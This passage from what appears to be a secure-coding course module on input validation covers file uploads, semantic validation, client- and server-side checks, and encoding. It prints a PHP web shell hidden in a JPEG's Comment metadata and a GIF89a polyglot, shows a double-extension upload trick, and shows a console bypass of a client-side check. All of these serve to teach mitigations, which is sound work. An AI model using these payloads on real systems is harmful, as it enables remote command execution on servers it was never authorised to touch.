instance, HTML's MIME type is <em>text/html</em>.</p>
<p>Both approaches to validating files have the same flaw: the values of
the file's name and MIME type can be spoofed. Attackers could take
advantage of this and upload a PHP file posing as an image, for
instance.</p>
<p>Another approach we can take to validate files is to inspect their
contents. Doing so thoroughly might not be possible all the time, but
some files have headers called <em>magic bytes</em><sup class="footnote-ref"><a href="#fn2" id="fnref2">2</a></sup> that can
help us achieve this. Some magic bytes have ASCII representations, but
this is not always the case.</p>
<p>A common example of magic bytes when working with images is the
identifier of animated GIFs. The magic bytes for that type of file are
<em>GIF89A</em>. This is commonly used by attackers to try to upload PHP
files by posing them as images.</p>
<p>Let's analyze an example. To follow along, let's start the VM in the
<em>Resources</em> section. We need to create an additional entry in our
<strong>/etc/hosts</strong> file to be able to access one of the examples.</p>
<pre id="fence-code-68" class="fence-code has-commands"><code>kali@kali:~$ <span class="code-block-ui">cat /etc/hosts</span>
127.0.0.1       localhost
127.0.1.1       kali
<span class="code-block-p">192.168.50.156  inputvalidation res.inputvalidation</span>
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</code></pre>
<blockquote>
<p>Listing 34 - Editing our hosts file</p>
</blockquote>
<p>Let's analyze a file that appears to be an image, but can also serve
as a working PHP file under specific circumstances.</p>
<p>We'll use the <strong>file</strong> command, which provides information about a
file. Its only parameter is the name of the file we want to analyze.</p>
<pre id="fence-code-69" class="fence-code has-commands"><code>student@inputvalidation:~$ <span class="code-block-ui">file /home/student/fileuploads/html/landboat.jpg</span>
landboat.jpg: <span class="code-block-p">JPEG image data</span>, baseline, precision 8, 2574x1930, components 3
</code></pre>
<blockquote>
<p>Listing 35 - Analyzing files on our Apache server</p>
</blockquote>
<p>The command indicates that the file is an image. If we open the file
using our browser, we'll find an image. Let's browse to its URL at
<strong>http://inputvalidation/landboat.jpg</strong>.</p>
<p>
</p><figure>
<img src="https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/SSD-100/images/input_validation/bfba60e419936e8714fe8f13b47de6ba-iv_apparently_normal_image.png" alt="Figure 8: Apparently a harmless image">
<figcaption>Figure 8: Apparently a harmless image</figcaption>
</figure>
<p></p>
<p>A common naming pattern that attackers follow takes advantage of the
fact that in some cases, naming validations only verify if the name
contains .jpg, .png, or .gif. Attackers take advantage of this by
using a name that contains an image extension, but also has another
extension, such as .php. Let's copy our file using the <strong>cp</strong> command.
We need two parameters: the original filename <strong>landboat.jpg</strong> and the
name of the new file. We'll use <strong>landboat.jpg.php</strong> as the new file
name.</p>
<pre id="fence-code-70" class="fence-code has-commands"><code>student@inputvalidation:~$ <span class="code-block-ui">cp /home/student/fileuploads/html/landboat.jpg /home/student/fileuploads/html/landboat.jpg.php</span>

student@inputvalidation:~$ <span class="code-block-ui">file /home/student/fileuploads/html/landboat.jpg.php</span>
landboat.jpg.php: <span class="code-block-p">JPEG image data</span>, baseline, precision 8, 2574x1930, components 3
</code></pre>
<blockquote>
<p>Listing 36 - Changing extension of an image so it appears to be a PHP file</p>
</blockquote>
<p>As expected, according to the <em>file</em> command, the extension didn't
change the nature of the file. Let's browse to its URL,
<strong>http://inputvalidation/landboat.jpg.php</strong>.</p>
<p>
</p><figure>
<img src="https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/SSD-100/images/input_validation/77bff17d1c1c8177fd63140dffd633d8-iv_image_code_execution.png" alt="Figure 9: Image code execution">
<figcaption>Figure 9: Image code execution</figcaption>
</figure>
<p></p>
<p>This time, the file behaves as a PHP script. Let's analyze how
this happened. We'll use the command <strong>exiftool</strong>.<sup class="footnote-ref"><a href="#fn3" id="fnref3">3</a></sup>
The only parameter we'll use is the name of the file,
<strong>/home/student/fileuploads/html/landboat.jpg.php</strong>. exiftool allows
us to display the picture's metadata, such as geolocation, which
camera was used to take the picture, or comments. The standard that
specifies the format of this metadata is <em>Exchangeable image file
format</em> (Exif).<sup class="footnote-ref"><a href="#fn4" id="fnref4">4</a></sup></p>
<pre id="fence-code-71" class="fence-code has-commands"><code>student@inputvalidation:~$ <span class="code-block-ui">exiftool /home/student/fileuploads/html/landboat.jpg.php</span>
ExifTool Version Number         : 12.16
File Name                       : landboat.jpg.php
...
MIME Type                       : image/jpeg
<span class="code-block-p">Comment                         : &lt;?php echo 'Command:'; if(isset($_GET['cmd'])){system($_GET['cmd']);} phpinfo(); __halt_compiler();</span>
...
Megapixels                      : 5.0
</code></pre>
<blockquote>
<p>Listing 37 - Executing exiftool</p>
</blockquote>
<p>In this case, the <em>Comment</em> field of our image contains PHP code that
executes a system command if a GET parameter is present, executes the
<em>phpinfo()</em> function, and halts the compiler.</p>
<p>Although most of the file <em>was</em> binary information related to the
image, the PHP parser found the <em>&lt;?php</em> tag and started its
execution, regardless of the contents of the rest of the file.</p>
<p>Attackers also employ a simplified version of this attack by uploading
a file that contains the magic bytes of an animated GIF, but also has
PHP code. Let's analyze the contents of a hypothetical malicious file
posing as a GIF image.</p>
<pre id="fence-code-72" class="fence-code"><code>GIF89a

&lt;?php
phpinfo();
</code></pre>
<blockquote>
<p>Listing 38 - GIF with PHP code</p>
</blockquote>
<p>A file with the contents of Listing 38 will be able to
deceive the PHP interpreter, provided that its filename ends in .php.
An interesting detail of this example is that because it contains the
appropriate magic bytes, the file in Listing 38 would
also deceive the file command, which would identify it as an image.</p>
<p>Let's explore some mitigations. One that does not require much
configuration or additional code is to store uploaded files in a place
that is not accessible to end-users, even outside the web root.</p>
<p>When working with images, it is recommended to strip all metadata. We
can also resize images so that if the file is not correct, the
library would fail to process the file. This provides a useful
indicator for rejecting input. Every language will offer different
ways to achieve this. However, there's a popular suite called
<em>ImageMagick</em><sup class="footnote-ref"><a href="#fn5" id="fnref5">5</a></sup> that can help us with this task. An
advantage of ImageMagick is that it has bindings with different
programming languages.</p>
<section class="sb-block"><p>When we are using third party extensions or libraries such as
ImageMagick, we need to be aware that they increase our attack
surface. To mitigate this risk, we need to keep ourselves informed
about known vulnerabilities and update them accordingly.</p></section>
<p>Another approach we can follow is to disable code execution in the
directory where untrusted files will be hosted. We can do so using an
<em>.htaccess</em><sup class="footnote-ref"><a href="#fn6" id="fnref6">6</a></sup> file in Apache, but this <em>can</em> be risky
because an attacker could find a way to overwrite or delete the file.</p>
<p>We can address this risk by creating a different <em>virtual
host</em><sup class="footnote-ref"><a href="#fn7" id="fnref7">7</a></sup> that disables execution and does not allow such
behavior to be overridden.</p>
<p>Let's investigate the required configuration to achieve this. We need to
make sure our SSH tunnel is open, then browse to
<strong>http://localhost:8080/?folder=/home/student/fileuploads</strong>.</p>
<pre id="fence-code-73" class="fence-code"><code>File: /home/student/fileuploads/000-default.conf
31: &lt;VirtualHost *:80&gt;
...
39:         <span class="code-block-s">ServerName res.inputvalidation</span>
40: 
41:         ServerAdmin webmaster@localhost
42:         DocumentRoot /var/www/html2
43:         <span class="code-block-p">php_value engine off</span>
...
59: &lt;/VirtualHost&gt;
60: 
61: &lt;Directory "/var/www/html2"&gt;
62: <span class="code-block-p">AllowOverride None</span>
63: &lt;/Directory&gt;

</code></pre>
<blockquote>
<p>Listing 39 - Virtual Host that does not allow execution</p>
</blockquote>
<p>Line 39 of Listing 39 contains the name of this
virtual host. This will be the URL that clients will need to use to
access it. Line 43 disables the execution of PHP files on this virtual
host. This assures us that even if an attacker were to upload a PHP
file, they won't be able to run it. Finally, line 62 instructs the
server that we don't want this configuration to be altered by
.htaccess files.</p>
<p>There's a copy of the file that contained the EXIF data in the virtual
host we just analyzed. Let's browse to its URL
(<strong>http://res.inputvalidation/landboat.jpg.php</strong>) and inspect how
Apache will handle it.</p>
<p>
</p><figure>
<img src="https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/SSD-100/images/input_validation/08d098ca77e905e3066243ce8f4b542b-iv_different_vhost.png" alt="Figure 10: Image in different Virtual Host">
<figcaption>Figure 10: Image in different Virtual Host</figcaption>
</figure>
<p></p>
<p>Excellent! The new virtual host prevented the code from executing. A
common variation of this approach is to upload files to a <em>cloud
bucket</em><sup class="footnote-ref"><a href="#fn8" id="fnref8">8</a></sup> such as S3. This also decreases our attack
surface because uploaded files end up not being executable.</p>
<p>Since images can be the path for dangerous attack vectors, we need to
be careful while validating them. We need to rely on validation
methods that are not spoofable, which is why file extensions and MIME
types are not enough. Even when we use magic bytes to verify file
contents, we need to take extra steps to be certain that a file is not
malicious before accepting it.</p>
<section class="footnote-container"><div class="footnote-item" id="fn1"><sup>1</sup><p>(Mozilla, 2023), <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types" target="_blank">https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn2"><sup>2</sup><p>(Wikipedia, 2023), <a href="https://en.wikipedia.org/wiki/List_of_file_signatures" target="_blank">https://en.wikipedia.org/wiki/List_of_file_signatures</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn3"><sup>3</sup><p>(Exiftool, 2023), <a href="https://exiftool.org/" target="_blank">https://exiftool.org/</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn4"><sup>4</sup><p>(Wikipedia, 2023), <a href="https://en.wikipedia.org/wiki/Exif" target="_blank">https://en.wikipedia.org/wiki/Exif</a> <a href="#fnref4" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn5"><sup>5</sup><p>(ImageMagick Studio, 1999), <a href="https://imagemagick.org/index.php" target="_blank">https://imagemagick.org/index.php</a> <a href="#fnref5" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn6"><sup>6</sup><p>(Digital Ocean, 2012), <a href="https://www.digitalocean.com/community/tutorials/how-to-use-the-htaccess-file" target="_blank">https://www.digitalocean.com/community/tutorials/how-to-use-the-htaccess-file</a> <a href="#fnref6" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn7"><sup>7</sup><p>(The Apache Software Foundation, 2023), <a href="https://httpd.apache.org/docs/2.4/mod/core.html#virtualhost" target="_blank">https://httpd.apache.org/docs/2.4/mod/core.html#virtualhost</a> <a href="#fnref7" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn8"><sup>8</sup><p>(Amazon, 2023), <a href="https://aws.amazon.com/s3/" target="_blank">https://aws.amazon.com/s3/</a> <a href="#fnref8" class="footnote-backref">↩︎</a></p>
</div></section></div><!----></div>

<h2>Semantic Validation</h2>

<div class="markdown-content text-main-color flex-grow my-6 mx-auto"><!----><div><p>When we validate inputs, sometimes they appear to be correct in the
way the values are written (making them <em>syntactically</em> correct). On
the other hand, <em>semantic</em> validation relates to the meaning of our
input, not just its structure or how those values are written. For
instance, the sentence "Fire is wet" is syntactically correct, but
it's semantically wrong.</p>
<p>Valid ranges are an example of semantic validation. We might have
assurances that we are getting a numeric value, but in most
situations, we also have constraints such as ranges of numbers,
especially in applications such as e-commerce sites.</p>
<p>For these types of validations, if they are not too complex, we can
implement them manually. However, most web frameworks have some sort
of validation functionality built-in, or in some other cases,
third-party validation libraries can be integrated with frameworks.
For instance, in Python, the <em>WTForms</em><sup class="footnote-ref"><a href="#fn1" id="fnref1">1</a></sup> library can be
integrated with <em>Flask</em><sup class="footnote-ref"><a href="#fn2" id="fnref2">2</a></sup> projects.</p>
<p>Some semantic validations can be difficult to implement manually. For
instance, a date can appear to be acceptable at first, but it might
end up not being real. For instance, "Mon, Feb 30th, 2023" is not a
valid date, but if we validate only syntactically, we might end up in
a situation where even though a value appears correct, it is not.</p>
<p>To validate dates, we don't even need external libraries. In Python,
the native <em>datetime</em><sup class="footnote-ref"><a href="#fn3" id="fnref3">3</a></sup> module provides ways to validate
if dates are correct or not by using <em>formats</em>.<sup class="footnote-ref"><a href="#fn4" id="fnref4">4</a></sup> The
formats represent a date component. For instance, <em>%Y</em> represents a
four-digit year.</p>
<p>Let's analyze an example. To follow along, let's start the VM in the
<em>Resources</em> section. We'll use datetime to validate date strings in
Python. First, we need to <strong>import</strong> the datetime module.</p>
<pre id="fence-code-74" class="fence-code has-commands"><code>student@inputvalidation:~$ <span class="code-block-ui">python3</span>
Python 3.10.6 (main, Nov 14 2022, 16:10:14) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; <span class="code-block-ui">from datetime import datetime</span>
</code></pre>
<blockquote>
<p>Listing 40 - Importing the library</p>
</blockquote>
<p>The datetime module contains helper functions such as
<em>strptime()</em><sup class="footnote-ref"><a href="#fn5" id="fnref5">5</a></sup> that allow us to manipulate dates. The
<em>strptime</em> function receives two parameters, the string that contains
our representation of a date and the format of our first string. If
the string adheres to that date format, we will obtain a
<em>datetime.datetime</em> object. Otherwise, we'll get a <em>ValueError</em>. Let's
explore an execution that returns correctly.</p>
<pre id="fence-code-75" class="fence-code has-commands"><code>&gt;&gt;&gt; <span class="code-block-ui">datetime.strptime("Sat, Feb 25th, 2023", "%a, %b %dth, %Y")</span>
<span class="code-block-s">datetime.datetime(2023, 2, 25, 0, 0)</span>
</code></pre>
<blockquote>
<p>Listing 41 - Successful execution of strptime</p>
</blockquote>
<p>As expected, the execution was successful and we obtained an object.
Something we should note about formats is that characters that do not
start with <em>%</em> are interpreted as literal strings. Next, let's analyze
an example of a non-existing date.</p>
<pre id="fence-code-76" class="fence-code has-commands"><code>&gt;&gt;&gt; <span class="code-block-ui">datetime.strptime("Mon, Feb 30th, 2023", "%a, %b %dth, %Y")</span>
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
  File "/usr/lib/python3.10/_strptime.py", line 568, in _strptime_datetime
    tt, fraction, gmtoff_fraction = _strptime(data_string, format)
  File "/usr/lib/python3.10/_strptime.py", line 534, in _strptime
    julian = datetime_date(year, month, day).toordinal() - \
<span class="code-block-p">ValueError: day is out of range for month</span>
</code></pre>
<blockquote>
<p>Listing 42 - Date validation in Python</p>
</blockquote>
<p>The date Mon, Feb 30th, 2023 is not correct, which is why we obtained
a <em>ValueError</em>.</p>
<p>Valid emails can be difficult to verify correctly, as we observed when
analyzing nuances using regular expressions. There are many RFCs that
explain the validity of email addresses. However, those rules are not
always followed, and some valid addresses can be deemed incorrect by
some applications.</p>
<p>PHP provides a function named <em>filter_var()</em><sup class="footnote-ref"><a href="#fn6" id="fnref6">6</a></sup> that
receives a value and an integer format. One of those formats is
<em>FILTER_VALIDATE_EMAIL</em>. It returns a value if the input is valid
according to the filter, or false if it's not. This can help us avoid
re-implementing email validation. However, even though this function
is accepted, there are still edge cases that should be considered
valid, but that this function rejects.</p>
<p><em>Serialization</em><sup class="footnote-ref"><a href="#fn7" id="fnref7">7</a></sup> attacks are also a risk that
we need to consider when we validate data. Manual validation of
serialized data is complex to implement manually. However, we can
securely configure the parsers that our programming language provides.</p>
<p>When we work with <em>XML</em><sup class="footnote-ref"><a href="#fn8" id="fnref8">8</a></sup> data, <em>XML External Entities</em>
(XXE)<sup class="footnote-ref"><a href="#fn9" id="fnref9">9</a></sup> can be very dangerous, but we can try to avoid them by
securely configuring our parsers so that this functionality is
disabled.</p>
<p>In cases where input is not only valid depending on its syntax but
also on its meaning to us, we need to use semantic validation. When
working with dates and emails, we can use functions in the standard
library of our programming language to help us. There are also
external libraries that we can use to achieve the same result.</p>
<section class="footnote-container"><div class="footnote-item" id="fn1"><sup>1</sup><p>(WTForms, 2008), <a href="https://wtforms.readthedocs.io/en/2.3.x/" target="_blank">https://wtforms.readthedocs.io/en/2.3.x/</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn2"><sup>2</sup><p>(Pallets, 2010), <a href="https://flask.palletsprojects.com/en/2.2.x/" target="_blank">https://flask.palletsprojects.com/en/2.2.x/</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn3"><sup>3</sup><p>(Python, 2023), <a href="https://docs.python.org/3/library/datetime.html" target="_blank">https://docs.python.org/3/library/datetime.html</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn4"><sup>4</sup><p>(Strftime, 2021), <a href="https://strftime.org/" target="_blank">https://strftime.org/</a> <a href="#fnref4" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn5"><sup>5</sup><p>(Digital Ocean, 2022), <a href="https://www.digitalocean.com/community/tutorials/python-string-to-datetime-strptime" target="_blank">https://www.digitalocean.com/community/tutorials/python-string-to-datetime-strptime</a> <a href="#fnref5" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn6"><sup>6</sup><p>(PHP, 2023), <a href="https://www.php.net/manual/en/function.filter-var.php" target="_blank">https://www.php.net/manual/en/function.filter-var.php</a> <a href="#fnref6" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn7"><sup>7</sup><p>(Microsoft, 2022), <a href="https://learn.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/serialization/" target="_blank">https://learn.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/serialization/</a> <a href="#fnref7" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn8"><sup>8</sup><p>(W3C, 2015), <a href="https://www.w3.org/standards/xml/core" target="_blank">https://www.w3.org/standards/xml/core</a> <a href="#fnref8" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn9"><sup>9</sup><p>(PortSwigger Ltd, 2023), <a href="https://portswigger.net/web-security/xxe" target="_blank">https://portswigger.net/web-security/xxe</a> <a href="#fnref9" class="footnote-backref">↩︎</a></p>
</div></section></div><!----></div>

<h2>Client-Side and Server-Side Validations</h2>

<div class="markdown-content text-main-color flex-grow my-6 mx-auto"><!----><div><p>We've analyzed some ways to mitigate risks with data we accept from
users. Now let's explore cases in which we need to validate data and
the implications of not doing so.</p>
<p>Although client-side validation is important, from a security
standpoint, it is not enough to protect us from malicious input. At
best, client-side validation should be thought of as a tool to improve
user experience.</p>
<p>The reason for this is that it is possible to connect to the backend
without triggering these validations. We can achieve this in many
ways, such as turning off JavaScript on our browser, rewriting the
definition of the JavaScript function via Web Developer Tools, or
using a proxy like <em>Burp Suite</em>.<sup class="footnote-ref"><a href="#fn1" id="fnref1">1</a></sup></p>
<p>However, if we also implement our validations server-side, we can
mitigate the risk of the client not being bound by our client-side
validations.</p>
<p>Let's analyze an example. To follow along, let's start the VM in the
<em>Resources</em> section at the bottom of this page. We'll also need to
make sure to recreate our SSH tunnel to access the source code.</p>
<p>We'll start by browsing to <strong>http://inputvalidation:8085</strong>, an
application that lets users change the color of a section by selecting
it from a dropdown list.</p>
<p>
</p><figure>
<img src="https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/SSD-100/images/input_validation/4d171fc460f963ee837863c454a2b6c1-iv_colors_1.png" alt="Figure 11: Colors application">
<figcaption>Figure 11: Colors application</figcaption>
</figure>
<p></p>
<p>This application has a client-side allowlist that should prevent the
form from submitting if a color that is not part of the list is
submitted, but there are no server-side validations. To access the
code, let's open another browser tab at
<strong>http://localhost:8080/?folder=/home/student/client_validation_bypass</strong>.</p>
<pre id="fence-code-78" class="fence-code"><code>File: /home/student/client_validation_bypass/static/scripts/colors.js
01: let allowedColors = <span class="code-block-p">["#6619D0", "#00BFCB", "#190634", "#FFFFFF"]</span>;
02: function validate_colors(){
03:     selectedColor = document.getElementById("color").value;
04:     canSubmitForm = allowedColors.includes(selectedColor);
05:     if(!canSubmitForm){
06:         alert("The color you chose is not allowed");
07:     }
08:     return canSubmitForm;
09: }
</code></pre>
<blockquote>
<p>Listing 43 - Client-side Allowlist</p>
</blockquote>
<p>Line 1 in Listing 43 contains a list of
permitted values. If the user tries to submit a different value,
the form will not submit. To achieve this behavior, this function is
called from the <em>onsubmit</em> event of the form. If the function returns
false, the form is not submitted.</p>
<p>Let's investigate how an attacker could take advantage of our lack of
server-side validations. First, let's right-click the button with the
label <em>Choose Color</em> and select the <em>Inspect</em> option from the context
menu. After doing so, we'll find the definition of the HTML form.</p>
<p>
</p><figure>
<img src="https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/SSD-100/images/input_validation/eb407f051dcfeb6e4f263137f6f370e9-iv_colors_2.png" alt="Figure 12: Inspecting the form">
<figcaption>Figure 12: Inspecting the form</figcaption>
</figure>
<p></p>
<p>The <em>form</em> tag contains the <em>onsubmit</em> attribute, which contains
<em>return validate_colors();</em>. Let's double-click the value of the
<em>onsubmit</em> attribute and delete its contents.</p>
<p>
</p><figure>
<img src="https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/SSD-100/images/input_validation/648dca3f2366c8a05a69272ae879d91c-iv_colors_3.png" alt="Figure 13: Removing the validation">
<figcaption>Figure 13: Removing the validation</figcaption>
</figure>
<p></p>
<p>By this point, the validation is no longer being triggered, so we can
test it by altering the values of the dropdown menu and submitting the
form.</p>
<p>To do so, let's right-click the dropdown menu and select <em>Inspect</em>.
We'll find the <em>select</em> tag. We can then expand it to list its
options.</p>
<p>
</p><figure>
<img src="https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/SSD-100/images/input_validation/f1c1191572d86012cb44ebfb6f0183a0-iv_colors_4.png" alt="Figure 14: Finding the values">
<figcaption>Figure 14: Finding the values</figcaption>
</figure>
<p></p>
<p>Let's double-click "Deep Purple" and replace it with "Gray", then
double-click "#6619D0" and replace it with "#DEDEDE".</p>
<p>
</p><figure>
<img src="https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/SSD-100/images/input_validation/e2eb9ab7e2e301b61a5bcb7ea3c06543-iv_colors_5.png" alt="Figure 15: Replacing a value">
<figcaption>Figure 15: Replacing a value</figcaption>
</figure>
<p></p>
<p>Now we can click on <em>Choose color</em>, and the page will load with a
color that should not be allowed.</p>
<p>
</p><figure>
<img src="https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/SSD-100/images/input_validation/6e7b57f80d35d3f2f0fcc0edaf4c682b-iv_colors_6.png" alt="Figure 16: Validation bypassed">
<figcaption>Figure 16: Validation bypassed</figcaption>
</figure>
<p></p>
<p>We have now bypassed the control. An important detail to notice is
that both the form tag and the select tag have been restored to their
original values by this point because the page reloaded, meaning it
returned to the state that is returned by the server.</p>
<p>With that in mind, let's analyze another bypass we could have used.
Let's navigate to the Developer Tools <em>Console</em> tab.</p>
<p>
</p><figure>
<img src="https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/SSD-100/images/input_validation/ec224e6b54bbf117d8dd0e82ac750da9-iv_colors_7.png" alt="Figure 17: Opening the console">
<figcaption>Figure 17: Opening the console</figcaption>
</figure>
<p></p>
<p>Using the Javascript console, let's rewrite the <em>validate_colors()</em>
function so that it always returns true.</p>
<pre id="fence-code-79" class="fence-code has-commands"><code><span class="code-block-ui">function validate_colors(){return true}</span>
</code></pre>
<blockquote>
<p>Listing 44 - Modified version of validate_colors()</p>
</blockquote>
<p>Let's type the contents of Listing 44 into
the console to alter the function.</p>
<p>
</p><figure>
<img src="https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/SSD-100/images/input_validation/c3dd4cb79698241483d16d724d50d473-iv_colors_8.png" alt="Figure 18: Modifying the validation function">
<figcaption>Figure 18: Modifying the validation function</figcaption>
</figure>
<p></p>
<p>In the function's current state, even if the form calls it, the
submission will not be stopped if we modify the value of the dropdown
list, because <em>validate_colors()</em> always returns true.</p>
<p>Let's analyze the mitigation. The only requirement to prevent this
issue is to re-implement the same allowlist on the server-side code.</p>
<pre id="fence-code-80" class="fence-code"><code>File: /home/student/client_validation_bypass/app.py
...
08: allowed_colors = ["#6619D0", "#00BFCB", "#190634", "#FFFFFF"]
...
10: @app.route('/', methods = ['GET', 'POST'])
11: def index():
12:     default_color = "#6619D0"
13:     if request.method == "GET":
14:         response = make_response(render_template("index.html", color=default_color, hex_color=default_color))
15:     else:
16:         if "color" in request.form:
17:             color = request.form.get('color')
18:             #Validation that we could implement to fix the problem
19:             <span class="code-block-p">#if not color in allowed_colors:</span>
20:             <span class="code-block-p">#    color = default_color</span>
21:         else:
22:             color = default_color
23:         response = make_response(render_template("index.html", color=color, hex_color=color))
24:     return response
...
</code></pre>
<blockquote>
<p>Listing 45 - Colors server-side code</p>
</blockquote>
<p>The comments on lines 19 and 20 contain the re-implementation of the
allowlist that would have prevented the misuse of the form. With that
control in place, if a user sends a different value, it won't be
accepted, and the default value will be used.</p>
<p>We cannot blindly trust client-side code. It can always be rewritten
by an attacker without our knowledge. This is the reason why every
control and validation that we implement needs to be present in the
client-side and the server-side code.</p>
<section class="footnote-container"><div class="footnote-item" id="fn1"><sup>1</sup><p>(PortSwigger, 2023), <a href="https://portswigger.net/burp" target="_blank">https://portswigger.net/burp</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</div></section></div><!----></div>

<h2>When Validation is not Enough</h2>

<div class="markdown-content text-main-color flex-grow my-6 mx-auto"><!----><div><p>In some cases, we might legitimately need to accept data that is
dangerous in some form. An example would include sites such as
StackOverflow, where all sorts of code is published.</p>
<p>We know that, when possible, it is preferable to implement an
allowlist. However, sometimes our allowlist could end up being the
whole universe of available characters, especially for fields such as
<em>names</em> and <em>last names</em> in globally-used applications (e.g. accented
characters and non-Latin characters). We can't be completely sure that
our allowlist won't cause problems. This is why we need to rely on
<em>defense in depth</em>,<sup class="footnote-ref"><a href="#fn1" id="fnref1">1</a></sup> which consists of a layered
approach to our security controls. This means that even if one control
fails, another one should mitigate risks. Let's explore some other
controls we can implement.</p>
<p>Besides rejecting and removing data that can be deemed unsafe, another
option is to encode it or escape it properly. Although these terms are
often used interchangeably, encoding and escaping have differences.</p>
<p><em>Encoding</em> is a way to present the same data in a different format. An
example of this is in URLs where we can have characters that might be
ambiguous, such as <em>&amp;</em>, which is used to separate query string
parameters. This means that if we want to include <em>&amp;</em> as
part of a value without it having its special meaning as a query
string delimiter, we need to URL-encode it as <em>%26</em>.</p>
<p>Another example of this is when we want to use characters such as <em>&gt;</em>
and <em>&lt;</em>, but we don't want them to be interpreted by the browser as
HTML tags. These two characters can be encoded as <em>&amp;lt;</em> and <em>&amp;gt;</em>
respectively, so that they are interpreted as regular characters and
not as delimiters for HTML tags. These conversions are known as <em>HTML
entities</em>.<sup class="footnote-ref"><a href="#fn2" id="fnref2">2</a></sup> We can use certain functions to help
with this, such as <em>htmlentities()</em><sup class="footnote-ref"><a href="#fn3" id="fnref3">3</a></sup>, which is
available in PHP.</p>
<p><em>Escaping</em> is a subset of encoding in which we only need to use a
prefix to prevent ambiguities with characters that have special
meanings. We used escaping when we analyzed regular expressions.</p>
<p>Even when we have validations in place, they can't be our only defense
against malicious input. Context is key. To understand how to defend
different inputs, we need to take into consideration the sinks where
those inputs will be sent.</p>
<p>If we know that particular parameters need to be
stored in a database, we need to use parameterized
queries, and if possible, helper functions such as
<em>mysqli_real_escape_string()</em><sup class="footnote-ref"><a href="#fn4" id="fnref4">4</a></sup> when we use
PHP.</p>
<p>We also need to consider sanitization when we want to present unsafe
values as part of our HTML. In such cases, we can use helper libraries
such as <em>DOMPurify</em>.<sup class="footnote-ref"><a href="#fn5" id="fnref5">5</a></sup> In scenarios where we need to
manually implement sanitization for this particular risk, we need to
consider that cleaning up HTML tags might not be enough. An attacker
could also override DOM events such as <em>onerror</em> on images.</p>
<p>To summarize, when we can't validate our input for varying reasons
such as the impossibility of defining allowlists or the need to
present unsafe data, we need to rely on other security controls such
as encoding and escaping.</p>
<section class="footnote-container"><div class="footnote-item" id="fn1"><sup>1</sup><p>(Fortinet Inc, 2023), <a href="https://www.fortinet.com/resources/cyberglossary/defense-in-depth" target="_blank">https://www.fortinet.com/resources/cyberglossary/defense-in-depth</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn2"><sup>2</sup><p>(W3Schools, 2023), <a href="https://www.w3schools.com/html/html_entities.asp" target="_blank">https://www.w3schools.com/html/html_entities.asp</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn3"><sup>3</sup><p>(PHP, 2023), <a href="https://www.php.net/manual/en/function.htmlentities" target="_blank">https://www.php.net/manual/en/function.htmlentities</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn4"><sup>4</sup><p>(PHP, 2023), <a href="https://www.php.net/manual/en/mysqli.real-escape-string.php" target="_blank">https://www.php.net/manual/en/mysqli.real-escape-string.php</a> <a href="#fnref4" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn5"><sup>5</sup><p>(Cure53, 2023), <a href="https://github.com/cure53/DOMPurify" target="_blank">https://github.com/cure53/DOMPurify</a> <a href="#fnref5" class="footnote-backref">↩︎</a></p>
</div></section></div><!----></div>

<!----><div><h2>Wrapping Up</h2>
<p>In this Learning Module, we have explored the most common sources of
input from users when we create websites. We explored how the way each
programming language handles variables can influence the way we should
approach input validation.</p>
<p>We introduced some controls that we can implement to verify values so
that they adhere to our business logic and also to prevent them from
introducing malicious payloads into our applications. To achieve this
goal, we explored how to define blocklists and allowlists. We
investigated the syntax required to verify formats using regular
expressions and analyzed ways to verify if our regular expressions
work as expected.</p>
<p>We explored how seemingly-benign files could be used by attackers to
gain remote execution, and some techniques we can use to help prevent
that from happening.</p>
<p>We covered how sometimes what is written is not the only aspect of our
validations, but we may also need to check the meaning of inputs.</p>
<p>Finally, we acknowledged that in some cases we need to allow unsafe
input, and introduced some security control concepts to help mitigate
risks that this unsafe input could bring.</p>
</div><!---->